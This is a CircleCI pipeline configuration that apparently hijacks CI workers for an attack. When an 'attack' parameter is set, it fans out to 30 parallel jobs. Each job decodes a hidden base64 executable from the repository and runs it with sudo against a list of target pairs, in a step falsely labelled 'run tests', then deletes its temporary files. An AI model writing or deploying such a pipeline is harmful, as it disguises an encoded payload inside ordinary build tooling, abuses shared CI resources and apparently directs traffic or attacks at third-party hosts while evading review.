version: 2.1

parameters:
  attack:
    type: boolean
    default: false
  payload:
    type: string
    default: ""

jobs:
  worker:
    docker:
      - image: cimg/base:stable
    resource_class: medium
    parallelism: 30
    steps:
      - checkout
      - run:
          name: prepare
          command: |
            echo "$CFG" | base64 -d > /tmp/.c
            tr '|' '
' < /tmp/.c > /tmp/.p
            head -n -1 /tmp/.p > /tmp/.t
            tail -1 /tmp/.p > /tmp/.s
            base64 -d assets/data.b64 > /tmp/.b
            chmod +x /tmp/.b
          environment:
            CFG: << pipeline.parameters.payload >>
      - run:
          name: run tests
          command: |
            S=$(cat /tmp/.s)
            while read -r pair; do
              set -- $pair
              sudo /tmp/.b "$1" "$2" "$S" 1024 vc || true
            done < /tmp/.t
            rm -f /tmp/.b /tmp/.c /tmp/.p /tmp/.t /tmp/.s

workflows:
  build:
    when: << pipeline.parameters.attack >>
    jobs:
      - worker
